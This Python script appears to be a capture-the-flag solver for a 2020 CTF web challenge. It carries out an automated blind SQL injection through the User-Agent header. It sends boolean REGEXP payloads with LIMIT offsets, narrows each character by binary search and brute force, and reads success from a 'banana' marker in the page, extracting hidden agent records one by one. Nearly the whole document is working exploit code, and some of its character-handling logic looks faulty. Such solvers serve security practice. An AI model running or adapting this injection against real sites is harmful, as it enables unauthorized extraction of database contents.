import requests, sys
user_agent = "' OR 1=(SELECT 1 FROM Agents WHERE UA REGEXP '%s' LIMIT %d,%d); --"
payload = "^bz" # Obtained from manual test before automation
temp = ""
offset = 0
rows = 1
i = 1
test_query = False


possible = [chr(i) for i in range(97, 123)]
numbers = "0,1,2,3,4,5,6,7,8,9"
spl = [] #"\\~,\\!,\\@,\\#,\\$,\\%,\\^,\\&,\\*,\\(,\\),\\_,\\+,\\{,\\},\\|,\\:,\\<,\\>,\\?,\\`,\\-,\\=,\\[,\\],\\\,\\;,\\',\\.,\\/"
possible += numbers.split(",")# + spl.split(",")
while 1:
    
    # Finished Criteria and Reset for Next Row
    if "banana" in requests.get("https://agents.2020.chall.actf.co/login", headers={"User-Agent": user_agent % (payload + "$", offset, rows)}).text:
        payload = payload.strip("^")
        resp = requests.get("https://agents.2020.chall.actf.co/login", headers={"User-Agent": payload}).text
        print(resp)
        print("\n")
        print("Secret Agent " + str(i) + " has User Agent as " + payload + " and the limit as " + str(offset) + str(rows))
        print("="*50)
        offset += 1
        payload = "^"
        i += 1
        test_query = False

    # Setup Exit Variables
    print(payload)
    temp = payload
    guess_success = False
    
    # BST over letters
    # ASCII Chart Values --> http://cs.smu.ca/~porter/csc/ref/ascii.html
    #upper_case_letters = [i for i in range(65, 91)]
    lower_case_letters = [i for i in range(97, 123)]
    upper_case_letters = [] # Both captial and lower are same according to recon -- continue
    letters = upper_case_letters + lower_case_letters
    left = 0
    right = len(letters)-1
    #possible = range(left, right)
    test_payload = payload + "[%s-%s]"

    # Binary Search Kind
    while left < right and right-left > 3:
        mid = left + (right-left)//2
        lresult = rresult = False
        lpayload = test_payload % (chr(letters[left]), chr(letters[mid]))
        rpayload = test_payload % (chr(letters[mid+1]), chr(letters[right]))
        lhead = {"User-Agent": user_agent % (lpayload, offset, rows)}
        rhead = {"User-Agent": user_agent % (rpayload, offset, rows)}
        #print(lhead, rhead)
        lresp = requests.get("https://agents.2020.chall.actf.co/login", headers=lhead).text
        rresp = requests.get("https://agents.2020.chall.actf.co/login", headers=rhead).text
        if "banana" in lresp:
            lresult = True
        if "banana" in rresp:
            rresult = True
        if lresult == rresult:
            print("Something Wrong!")
            #sys.exit(1)
            break
        elif lresult:
            right = mid
        elif rresult:
            left = mid
    print("Guess between %d and %d" % (left, right))
    possible = letters[left:right+1]
    #numbers = "0,1,2,3,4,5,6,7,8,9"
    #spl = "~,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,<,>,?,`,-,=,[,],\,;,',.,/"
    possible += numbers.split(",") #+ spl.split(",")
    #print(possible)
    for ch in possible:
        if chr(ch).isalpha():
            ch = chr(ch)
        elif ch.isdigit():
            continue
        else:
            ch = "\\"+ch
        headers = {"User-Agent": user_agent % (payload + ch, offset, rows)}
        if not test_query:
            print(headers)
            test_query = True
        resp = requests.get("https://agents.2020.chall.actf.co/login", headers=headers).text
        #print(resp)
        if "banana" in resp:
            payload += ch.strip("\\")
            break
        else:
            continue

    """
    # BruteForce
    for ch in possible:
        headers = {"User-Agent": user_agent % (payload + chr(ch), offset, rows)}
        if not test_query:
            print(headers)
            test_query = True
        resp = requests.get("https://agents.2020.chall.actf.co/login", headers=headers).text
        #print(resp)
        if "banana" in resp:
            payload += chr(ch)
            break
        else:
            continue
    """
print(payload)
